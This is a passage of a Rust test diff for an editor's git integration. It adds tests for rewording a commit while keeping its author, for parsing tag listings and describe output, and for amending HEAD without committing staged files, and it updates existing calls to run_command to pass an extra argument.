+                    "--date=raw".into(),
+                    second.clone(),
+                ],
+                None,
+                env.clone(),
+                HashMap::default(),
+            )
+            .await
+            .unwrap();
+        assert!(author.succeeded(), "{}", author.failure_message());
+        let fields: Vec<&str> = author.stdout.trim_end().split('\0').collect();
+        assert_eq!(
+            fields.len(),
+            3,
+            "unexpected author line: {:?}",
+            author.stdout
+        );
+        let author_env = HashMap::from_iter([
+            ("GIT_AUTHOR_NAME".to_string(), fields[0].to_string()),
+            ("GIT_AUTHOR_EMAIL".to_string(), fields[1].to_string()),
+            ("GIT_AUTHOR_DATE".to_string(), fields[2].to_string()),
+        ]);
+
+        let rebuilt = repository
+            .run_command(
+                vec![
+                    "commit-tree".into(),
+                    format!("{second}^{{tree}}"),
+                    "-p".into(),
+                    format!("{second}^"),
+                    "-m".into(),
+                    "second (reworded)".into(),
+                ],
+                None,
+                env.clone(),
+                author_env,
+            )
+            .await
+            .unwrap();
+        assert!(rebuilt.succeeded(), "{}", rebuilt.failure_message());
+        let rebuilt_sha = rebuilt.stdout.trim().to_string();
+
+        let rebased = repository
+            .run_command(
+                vec![
+                    "rebase".into(),
+                    "--autostash".into(),
+                    "--onto".into(),
+                    rebuilt_sha,
+                    second,
+                    "main".into(),
+                ],
+                None,
+                env,
+                HashMap::default(),
+            )
+            .await
+            .unwrap();
+        assert!(rebased.succeeded(), "{}", rebased.failure_message());
+
+        assert_eq!(
+            git_command_output(repo_dir.path(), ["log", "--format=%s", "--reverse"]),
+            "first\nsecond (reworded)\nthird"
+        );
+        assert_eq!(
+            git_command_output(repo_dir.path(), ["log", "--format=%ae", "--reverse"]),
+            "test@zed.dev\nother@example.com\ntest@zed.dev",
+            "the rewritten commit has to keep its original author"
+        );
+    }
+
+    /// [`TAG_LIST_FORMAT`] and `describe --tags --long` are read back by hand, so a real git has
+    /// to be the one producing the text the parsers are given.
+    #[gpui::test]
+    async fn test_tag_listing_and_describe_against_real_git(cx: &mut TestAppContext) {
+        disable_git_global_config();
+        cx.executor().allow_parking();
+
+        let repo_dir = tempfile::tempdir().unwrap();
+        git_init_repo(repo_dir.path());
+        let file_path = repo_dir.path().join("file.txt");
+
+        fs::write(&file_path, "one\n").unwrap();
+        git_command(repo_dir.path(), ["add", "file.txt"]);
+        git_command(repo_dir.path(), ["commit", "-m", "first"]);
+        git_command(repo_dir.path(), ["tag", "v1.0.0"]);
+        let tagged = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"]);
+
+        fs::write(&file_path, "two\n").unwrap();
+        git_command(repo_dir.path(), ["commit", "-am", "second"]);
+        git_command(
+            repo_dir.path(),
+            ["tag", "-a", "v2.0.0", "-m", "リリース 2.0"],
+        );
+        let annotated_target = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"]);
+
+        fs::write(&file_path, "three\n").unwrap();
+        git_command(repo_dir.path(), ["commit", "-am", "third"]);
+
+        let repository = open_repository(repo_dir.path(), cx);
+        let env = Arc::new(test_commit_envs());
+
+        let listed = repository
+            .run_command(
+                vec![
+                    "for-each-ref".into(),
+                    "--sort=-creatordate".into(),
+                    format!("--format={TAG_LIST_FORMAT}"),
+                    "refs/tags/".into(),
+                ],
+                None,
+                env.clone(),
+                HashMap::default(),
+            )
+            .await
+            .unwrap();
+        assert!(listed.succeeded(), "{}", listed.failure_message());
+        let tags = TagInfo::parse_list(&listed.stdout);
+        let tag_named = |name: &str| -> TagInfo {
+            tags.iter()
+                .find(|tag| tag.name == name)
+                .unwrap_or_else(|| panic!("{name} is missing from {:?}", listed.stdout))
+                .clone()
+        };
+        // The order is git's (`--sort=-creatordate`), and two tags made in the same second can
+        // come back either way round, so this checks the fields rather than the sequence.
+        let annotated = tag_named("v2.0.0");
+        assert_eq!(
+            annotated,
+            TagInfo {
+                name: "v2.0.0".into(),
+                // The peeled commit, not the tag object.
+                commit_sha: annotated_target,
+                created_at_unix: annotated.created_at_unix,
+                subject: Some("リリース 2.0".into()),
+                annotated: true,
+            }
+        );
+        assert!(
+            annotated.created_at_unix.is_some_and(|seconds| seconds > 0),
+            "`%(creatordate:raw)` has to yield a timestamp: {:?}",
+            listed.stdout
+        );
+        let lightweight = tag_named("v1.0.0");
+        assert_eq!(
+            lightweight,
+            TagInfo {
+                name: "v1.0.0".into(),
+                commit_sha: tagged,
+                created_at_unix: lightweight.created_at_unix,
+                // `%(contents:subject)` is the tagged commit's subject for a lightweight tag,
+                // which is not a tag message and must not be shown as one.
+                subject: None,
+                annotated: false,
+            }
+        );
+
+        let described = repository
+            .run_command(
+                vec![
+                    "describe".into(),
+                    "--tags".into(),
+                    "--long".into(),
+                    "HEAD".into(),
+                ],
+                None,
+                env,
+                HashMap::default(),
+            )
+            .await
+            .unwrap();
+        assert!(described.succeeded(), "{}", described.failure_message());
+        let distance =
+            TagDistance::parse(described.stdout.trim()).expect("describe output must parse");
+        assert_eq!(distance.tag, "v2.0.0");
+        assert_eq!(distance.commits_since, 1);
+        assert!(!distance.short_sha.is_empty());
+    }
+
+    /// Rewording HEAD goes through `commit --amend --only -m`, which must leave whatever the user
+    /// had staged staged instead of committing it along with the new message.
+    #[gpui::test]
+    async fn test_amending_the_head_message_leaves_staged_work_alone(cx: &mut TestAppContext) {
+        disable_git_global_config();
+        cx.executor().allow_parking();
+
+        let repo_dir = tempfile::tempdir().unwrap();
+        git_init_repo(repo_dir.path());
+
+        fs::write(repo_dir.path().join("committed.txt"), "one\n").unwrap();
+        git_command(repo_dir.path(), ["add", "committed.txt"]);
+        git_command(repo_dir.path(), ["commit", "-m", "first"]);
+
+        fs::write(repo_dir.path().join("staged.txt"), "work in progress\n").unwrap();
+        git_command(repo_dir.path(), ["add", "staged.txt"]);
+
+        let repository = open_repository(repo_dir.path(), cx);
+        let amended = repository
+            .run_command(
+                vec![
+                    "commit".into(),
+                    "--amend".into(),
+                    "--only".into(),
+                    "-m".into(),
+                    "first (reworded)".into(),
+                ],
+                None,
+                Arc::new(test_commit_envs()),
+                HashMap::default(),
+            )
+            .await
+            .unwrap();
+        assert!(amended.succeeded(), "{}", amended.failure_message());
+
+        assert_eq!(
+            git_command_output(repo_dir.path(), ["log", "--format=%s"]),
+            "first (reworded)"
+        );
+        assert_eq!(
+            git_command_output(
+                repo_dir.path(),
+                ["show", "--name-only", "--format=", "HEAD"]
+            ),
+            "committed.txt",
+            "the staged file must not have been swept into the amended commit"
+        );
+        assert_eq!(
+            git_command_output(repo_dir.path(), ["diff", "--cached", "--name-only"]),
+            "staged.txt",
+            "and it must still be staged afterwards"
         );
     }
 
@@ -6612,7 +7590,12 @@ mod tests {
         let env = Arc::new(test_commit_envs());
 
         let patch = repository
-            .run_command(PatchSource::Worktree.args(), None, env.clone())
+            .run_command(
+                PatchSource::Worktree.args(),
+                None,
+                env.clone(),
+                HashMap::default(),
+            )
             .await
             .unwrap();
         assert!(patch.succeeded(), "{}", patch.failure_message());
@@ -6626,6 +7609,7 @@ mod tests {
                 vec!["apply".into()],
                 Some(patch.stdout.clone()),
                 env.clone(),
+                HashMap::default(),
             )
             .await
             .unwrap();
@@ -6633,7 +7617,12 @@ mod tests {
         assert_eq!(fs::read_to_string(&file_path).unwrap(), "changed\n");
 
         let head_patch = repository
-            .run_command(PatchSource::HeadCommit.args(), None, env.clone())
+            .run_command(
+                PatchSource::HeadCommit.args(),
+                None,
+                env.clone(),
+                HashMap::default(),
+            )
             .await
             .unwrap();
         assert!(head_patch.succeeded(), "{}", head_patch.failure_message());
@@ -6648,6 +7637,7 @@ mod tests {
                 vec!["apply".into()],
                 Some("this is not a patch\n".to_string()),
                 env,
+                HashMap::default(),
             )
             .await
             .expect("a rejected patch must not be reported as a failed command");
